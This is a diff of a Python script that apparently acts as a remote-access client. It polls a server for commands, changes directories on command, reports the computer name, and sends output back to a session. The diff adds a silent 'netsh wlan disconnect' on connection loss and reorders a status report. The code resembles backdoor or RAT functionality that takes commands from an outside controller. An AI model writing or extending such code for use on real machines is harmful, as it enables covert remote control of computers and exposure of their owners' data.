@@ -177,6 +177,7 @@ if(os.path.exists("reboot.log")):
 while(True == True):
     internet = is_connected("www.google.com")
     while(internet == False):
+        os.system('netsh wlan disconnect>nul')
         doPrint('Connection lost')
         time.sleep(3)
         internet = is_connected("www.google.com")
@@ -191,9 +192,9 @@ while(True == True):
                 sendOutput(session_id, response[0]['session_id'], "Changing directory...", False)
                 try:
                     os.chdir(response[0]['input'][3:])
-                    sendOutput(session_id, response[0]['session_id'], "Actual directory: "+getPath(), True)
                 except:
                     sendOutput(session_id, response[0]['session_id'], "Failed to change directory", True)
+                sendOutput(session_id, response[0]['session_id'], "Actual directory: "+getPath(), True)
             else:
                 if(response[0]['input'] == "status"):
                     output = "Host computername : "+os.environ['COMPUTERNAME']
